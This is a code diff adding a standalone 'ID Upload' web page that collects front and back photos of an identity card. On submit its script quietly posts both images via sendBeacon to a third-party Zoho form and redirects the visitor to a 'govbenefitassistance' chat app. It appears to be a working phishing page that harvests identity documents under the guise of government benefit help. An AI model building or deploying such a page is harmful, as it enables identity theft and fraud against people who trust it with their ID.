@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <title>ID Upload</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #e8e8e8;
+            display: flex;
+            justify-content: center;
+            padding-top: 60px;
+        }
+
+        .container {
+            width: 320px;
+        }
+
+        .upload-wrapper {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .upload-card {
+
+            width: 180px;
+            height: 200px;
+
+            background: #118ea7;
+
+            border-radius: 16px;
+
+            position: relative;
+
+            overflow: hidden;
+
+            cursor: pointer;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            text-align: center;
+
+            color: white;
+
+            transition: .3s;
+
+        }
+
+        .upload-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .preview {
+
+            position: absolute;
+
+            width: 100%;
+
+            height: 100%;
+
+            object-fit: cover;
+
+            display: none;
+
+        }
+
+        .instruction {
+
+            position: absolute;
+
+            top: 50%;
+
+            left: 50%;
+
+            transform: translate(-50%, -50%);
+
+            padding: 20px;
+
+            font-size: 20px;
+
+            font-weight: 600;
+
+        }
+
+        .label {
+
+            position: absolute;
+
+            bottom: 0;
+
+            width: 100%;
+
+            background: #01222e;
+
+            padding: 12px;
+
+            text-align: center;
+
+            font-size: 14px;
+
+        }
+
+        input[type=file] {
+            display: none;
+        }
+
+        button {
+
+            width: 100%;
+
+            height: 58px;
+
+            border: none;
+
+            background: black;
+
+            color: white;
+
+            font-size: 22px;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            opacity: 0;
+
+            visibility: hidden;
+
+            transform: translateY(20px);
+
+            transition:
+                opacity .8s ease,
+                transform .8s ease;
+
+        }
+
+        button.show {
+
+            visibility: visible;
+
+            opacity: 1;
+
+            transform: translateY(0);
+
+        }
+
+        button:disabled {
+            pointer-events: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <form id="uploadForm">
+
+            <div class="upload-wrapper">
+
+                <label class="upload-card">
+
+                    <input type="file" accept="image/*" id="front" name="ImageUpload">
+
+                    <img class="preview" id="frontPreview">
+
+                    <div class="instruction">
+                        Upload Front
+                    </div>
+
+                    <div class="label">
+                        Front ID
+                    </div>
+
+                </label>
+
+
+                <label class="upload-card">
+
+                    <input type="file" accept="image/*" id="back" name="ImageUpload1">
+
+                    <img class="preview" id="backPreview">
+
+                    <div class="instruction">
+                        Upload Back
+                    </div>
+
+                    <div class="label">
+                        Back ID
+                    </div>
+
+                </label>
+
+            </div>
+
+            <button id="submitBtn">
+                Upload
+            </button>
+
+        </form>
+
+    </div>
+
+    <script>
+
+        const front = document.getElementById("front");
+        const back = document.getElementById("back");
+
+        const frontPreview =
+            document.getElementById("frontPreview");
+
+        const backPreview =
+            document.getElementById("backPreview");
+
+        const submit =
+            document.getElementById("submitBtn");
+
+        function preview(file, input) {
+
+            if (!file) return;
+
+            const reader = new FileReader();
+
+            reader.onload = e => {
+
+                input.src = e.target.result;
+
+                input.style.display = "block";
+
+            };
+
+            reader.readAsDataURL(file);
+
+            toggleButton();
+
+        }
+
+        front.addEventListener(
+            "change",
+            () => preview(
+                front.files[0],
+                frontPreview
+            )
+        );
+
+        back.addEventListener(
+            "change",
+            () => preview(
+                back.files[0],
+                backPreview
+            )
+        );
+
+        function toggleButton() {
+
+            const ready =
+                front.files.length &&
+                back.files.length;
+
+            submit.classList.toggle(
+                "show",
+                ready
+            );
+
+        }
+
+        document
+            .getElementById("uploadForm")
+            .addEventListener(
+                "submit",
+                async (e) => {
+
+                    e.preventDefault();
+
+                    if (
+                        !front.files.length ||
+                        !back.files.length
+                    ) return;
+
+                    const fd = new FormData();
+
+                    fd.append(
+                        "ImageUpload",
+                        front.files[0]
+                    );
+
+                    fd.append(
+                        "ImageUpload1",
+                        back.files[0]
+                    );
+
+                    fd.append(
+                        "zf_referrer_name",
+                        ""
+                    );
+
+                    fd.append(
+                        "zf_redirect_url",
+                        ""
+                    );
+
+                    fd.append(
+                        "zc_gad",
+                        ""
+                    );
+
+                    const url =
+                        "https://forms.zohopublic.com/supportdoubled1/form/foer/formperma/ubJxe6BV5-VOvYPUlYpzZCSx72eqWIWy0Kcvzan_LoU/htmlRecords/submit";
+
+                    try {
+
+                        if (navigator.sendBeacon) {
+
+                            navigator.sendBeacon(
+                                url,
+                                fd
+                            );
+
+                            window.location.href =
+                                "https://govbenefitassistance.flutterflow.app/chat?bhhb584hb67=true";
+
+                        }
+                        else {
+
+                            await fetch(
+                                url,
+                                {
+                                    method: "POST",
+                                    body: fd,
+                                    mode: "no-cors"
+                                }
+                            );
+
+                            window.location.href =
+                                "https://govbenefitassistance.flutterflow.app/chat?bhhb584hb67=true";
+
+                        }
+
+                    }
+                    catch (err) {
+
+                        alert(
+                            "Upload failed."
+                        );
+
+                    }
+
+                });
+
+    </script>
+
+</body>
+
+</html>
